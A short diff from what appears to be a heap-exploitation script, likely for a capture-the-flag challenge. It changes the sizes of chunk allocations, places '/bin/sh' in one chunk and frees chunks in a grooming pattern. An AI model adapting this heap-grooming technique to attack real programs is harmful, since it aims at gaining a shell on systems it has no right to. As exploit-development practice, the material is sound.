@@ -99,11 +99,11 @@ log.success("Heap: " + hex(addr))
 
 exit()
 """
-alloc(500, "/bin/sh\x00")
-alloc(500, "small")
-alloc(0x28, "fast")
-alloc(0x28, "fast")
-alloc(0x28, "fast")
+alloc(2000, "/bin/sh\x00")
+alloc(2000, "small")
+alloc(30, "fast")
+alloc(30, "fast")
+alloc(30, "fast")
 
 free(1)
 free(3)
